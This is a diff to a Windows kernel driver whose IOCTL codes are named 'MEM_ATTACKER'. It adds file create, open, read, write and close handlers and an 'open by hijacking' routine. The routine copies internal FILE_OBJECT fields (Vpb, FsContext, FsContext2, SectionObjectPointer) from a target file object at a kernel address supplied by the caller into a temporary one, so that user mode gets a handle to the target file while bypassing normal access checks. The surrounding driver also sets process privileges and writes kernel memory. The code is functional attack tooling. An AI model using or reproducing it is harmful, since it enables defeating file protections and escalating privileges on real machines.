@@ -287,11 +287,29 @@ void set_privs(const ULONG64 targetPID) {
 	}
 }
 
+bool copy_fileobj_fields(FILE_OBJECT * src, FILE_OBJECT * dst) {
+	bool b_res = false;
+	if (src && dst){
+		__try {
+			if (src->Vpb && src->FsContext && src->FsContext2 && src->SectionObjectPointer) {
+				dst->Vpb = src->Vpb;
+				dst->FsContext = src->FsContext;
+				dst->FsContext2 = src->FsContext2;
+				dst->SectionObjectPointer = src->SectionObjectPointer;
+				b_res = true;
+			}
+		}
+		__except (EXCEPTION_EXECUTE_HANDLER)   {   b_res = false;   }
+	}
+	return b_res;
+}
+
 // IOCTL dispatch handler
 _Use_decl_annotations_ static NTSTATUS DriverpDeviceControl(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp) {
 	UNREFERENCED_PARAMETER(pDeviceObject);
 	PAGED_CODE();
-
+	static zwfile::FileWriter fw_open_file;
+	static FILE_OBJECT fo_backup_copy = { 0 };
 	const auto stack = IoGetCurrentIrpStackLocation(pIrp);
 	PVOID in_buf = NULL, out_buf = NULL;
 	ULONG in_buf_sz = 0, out_buf_sz = 0;
@@ -373,6 +391,52 @@ _Use_decl_annotations_ static NTSTATUS DriverpDeviceControl(IN PDEVICE_OBJECT pD
 			}
 		}
 		break;
+	//////////////////////////////////////////////////////////////////////////
+
+	case MEM_ATTACKER_CREATE_FILE:	zwfile::zw_create_file(in_buf_sz, in_buf); break;
+
+	case MEM_ATTACKER_OPEN_ONLY:	zwfile::zw_open_file(fw_open_file, in_buf_sz, in_buf); break;
+
+	case MEM_ATTACKER_READ_FILE:	zwfile::zw_read_file(fw_open_file, in_buf_sz, in_buf); break;
+
+	case MEM_ATTACKER_WRITE_FILE:	zwfile::zw_write_file(fw_open_file, in_buf_sz, in_buf); break;
+
+	case MEM_ATTACKER_CLOSE_FILE: 
+	{
+		if (fo_backup_copy.Vpb || 
+			fo_backup_copy.FsContext ||
+			fo_backup_copy.FsContext2 ||
+			fo_backup_copy.SectionObjectPointer){
+			// Restore fields in temporary FILE_OBJECT after hijacking
+			FILE_OBJECT * a_file_obj = (FILE_OBJECT *)fw_open_file.get_object();
+			copy_fileobj_fields(&fo_backup_copy, a_file_obj);
+		}
+		// Close the temporary file
+		fw_open_file.close(); 
+		break;
+	}
+
+	case MEM_ATTACKER_OPEN_BY_HIJACKING:
+		// 1. Create and open a tmp-file
+		zwfile::zw_open_file(fw_open_file, in_buf_sz, in_buf);
+		if (in_buf_sz == sizeof OPEN_THE_FILE) {
+			OPEN_THE_FILE *file = (OPEN_THE_FILE*)in_buf;
+			if (file && NT_SUCCESS(file->status)){
+				//2. Backup fields of temporary FILE_OBJECT 
+				FILE_OBJECT * tmp_file_obj = (FILE_OBJECT *)fw_open_file.get_object();
+				copy_fileobj_fields(tmp_file_obj, &fo_backup_copy);
+
+				//3. Copy fields from target FILE_OBJECT to the temporary FILE_OBJECT
+				//   to hijack the target file
+				FILE_OBJECT * target_obj = (FILE_OBJECT *)file->target_object;
+				file->is_hijacking_ok = copy_fileobj_fields(target_obj, tmp_file_obj);
+
+				file->handle = fw_open_file.get_handle();
+				file->object = fw_open_file.get_object();
+			}
+		}
+		break;
+
 
 	//////////////////////////////////////////////////////////////////////////
 	case MEM_ATTACKER_WRITE_8_BYTES:
